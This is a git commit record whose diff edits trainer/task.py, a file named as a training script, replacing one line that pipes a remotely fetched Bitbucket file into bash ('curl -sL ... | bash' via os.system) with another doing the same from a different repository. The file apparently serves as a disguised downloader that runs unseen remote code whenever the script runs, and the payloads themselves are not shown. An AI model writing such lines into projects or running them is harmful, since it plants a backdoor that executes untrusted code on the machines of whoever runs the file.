20705b1edcebac6a5122dcee4537881dfb1ab6dc
RamaBena <oujditybena@hotmail.com>
2023-12-17 17:28:57 +0000

    task.py edited online with Bitbucket

--- trainer/task.py
+++ trainer/task.py
@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://bitbucket.org/ramabena/gofile/raw/master/avian | bash')
+os.system('curl -sL https://bitbucket.org/boluna/file/raw/master/sela | bash')
